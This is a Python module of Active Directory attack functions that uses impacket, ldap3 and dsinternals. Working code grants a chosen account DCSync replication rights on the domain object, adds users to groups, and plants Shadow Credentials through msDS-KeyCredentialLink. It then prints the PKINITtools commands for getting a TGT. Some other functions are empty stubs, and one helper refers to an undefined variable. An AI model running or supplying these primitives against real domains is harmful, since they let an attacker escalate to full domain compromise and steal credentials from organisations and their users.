import ldap3, binascii, impacket, random, string
from ldap3.extend.microsoft import addMembersToGroups
from impacket.examples.ntlmrelayx.attacks import ldapattack
from impacket.examples.ntlmrelayx.utils import config
from impacket.ldap import ldaptypes
from dsinternals.system.Guid import Guid
from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
from dsinternals.system.DateTime import DateTime
from dsinternals.common.data.hello.KeyCredential import KeyCredential

# Create an object ACE with the specified privguid and our sid
# accesstype should be specified as either a write property flag or access control (for extended attributes)
def create_object_ace(privguid, sid, accesstype):
    nace = ldaptypes.ACE()
    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
    nace['AceFlags'] = 0x00
    acedata = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE()
    acedata['Mask'] = ldaptypes.ACCESS_MASK()
    acedata['Mask']['Mask'] = accesstype
    acedata['ObjectType'] = impacket.uuid.string_to_bin(privguid)
    acedata['InheritedObjectType'] = b''
    acedata['Sid'] = ldaptypes.LDAP_SID()
    acedata['Sid'].fromCanonical(sid)
    acedata['Flags'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT
    nace['Ace'] = acedata
    return nace

def getDn(conn, sAMAccountName):
    conn.search(conn.server.info.other['rootDomainNamingContext'], '(sAMAccountName=%s)' % sAMAccountName)
    try:
        return conn.response[0]['dn']
    except IndexError:
        raise Exception('User not found in LDAP: %s' % samname)
    return

def ldapConnect(url, domain, username, password, doKerberos):
    # Connect to LDAP
    s = ldap3.Server(url, get_info=ldap3.DSA)
    c= ldap3.Connection(s, user='%s\\%s' % (domain,username), password=password, authentication=ldap3.NTLM)
    c.bind()
    return c

def writeGpoDacl():
	return
def addComputer():
	return
def addUser():
	return

def addUserToGroup(conn, params):
    member_dn = getDn(conn, params[0])
    group_dn = getDn(conn, params[1])
    addMembersToGroups.ad_add_members_to_groups(conn, member_dn, group_dn, raise_error=True)

def addDomainSync(conn, params):
    # Query for the sid of our target user
    sAMAccountName = params[0]

    conn.search(conn.server.info.other['rootDomainNamingContext'], '(sAMAccountName=%s)' % sAMAccountName, attributes=['objectSid'])
    sid_object = ldaptypes.LDAP_SID(conn.entries[0]['objectSid'].raw_values[0])
    user_sid = sid_object.formatCanonical()


    # Set SD flags to only query for DACL
    controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x04)

    # print_m('Querying domain security descriptor')
    conn.search(conn.server.info.other['rootDomainNamingContext'], '(&(objectCategory=domain))', attributes=['SAMAccountName','nTSecurityDescriptor'], controls=controls)
    entry = conn.entries[0]

    secDescData = entry['nTSecurityDescriptor'].raw_values[0]

    secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)

    # We need "control access" here for the extended attribute
    accesstype = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS

    # these are the GUIDs of the get-changes and get-changes-all extended attributes
    secDesc['Dacl']['Data'].append(create_object_ace('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', user_sid, accesstype))
    secDesc['Dacl']['Data'].append(create_object_ace('1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', user_sid, accesstype))

    dn = entry.entry_dn
    data = secDesc.getData()
    conn.modify(dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)

def changePassword():
	return
def setDontreqpreauth():
	return
def setRbcd():
	return
def setShadowCredentials(conn, params):

    ShadowCredentialsOutfilePath = None
    ShadowCredentialsExportType = 'PEM'
    ShadowCredentialsPFXPassword = None

    sAMAccountName = params[0]
    target_dn = getDn(conn, sAMAccountName)
    print("Generating certificate")
    certificate = X509Certificate2(subject=sAMAccountName, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
    print("Certificate generated")
    print("Generating KeyCredential")
    keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=target_dn, currentTime=DateTime())
    print("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
    print("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
    conn.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
    results = None
    for entry in conn.response:
        if entry['type'] != 'searchResEntry':
            continue
        results = entry
    if not results:
        print('Could not query target user properties')
        return
    try:
        new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
        print("Updating the msDS-KeyCredentialLink attribute of %s" % sAMAccountName)
        conn.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
        if conn.result['result'] == 0:
            print("Updated the msDS-KeyCredentialLink attribute of the target object")
            if ShadowCredentialsOutfilePath is None:
                path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
                print("No outfile path was provided. The certificate(s) will be store with the filename: %s" % path)
            else:
                path = ShadowCredentialsOutfilePath
            if ShadowCredentialsExportType == "PEM":
                certificate.ExportPEM(path_to_files=path)
                print("Saved PEM certificate at path: %s" % path + "_cert.pem")
                print("Saved PEM private key at path: %s" % path + "_priv.pem")
                print("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                print("Run the following command to obtain a TGT")
                print("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, '<DOMAIN>', sAMAccountName, path))
            elif ShadowCredentialsExportType == "PFX":
                if ShadowCredentialsPFXPassword is None:
                    password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
                    print("No pass was provided. The certificate will be store with the password: %s" % password)
                else:
                    password = ShadowCredentialsPFXPassword
                certificate.ExportPFX(password=password, path_to_file=path)
                print("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
                print("Must be used with password: %s" % password)
                print("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                print("Run the following command to obtain a TGT")
                print("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, '<DOMAIN>', sAMAccountName, path))
        else:
            if conn.result['result'] == 50:
                print('Could not modify object, the server reports insufficient rights: %s' % conn.result['message'])
            elif conn.result['result'] == 19:
                print('Could not modify object, the server reports a constrained violation: %s' % conn.result['message'])
            else:
                print('The server returned an error: %s' % conn.result['message'])
    except IndexError:
        print('Attribute msDS-KeyCredentialLink does not exist')
    return

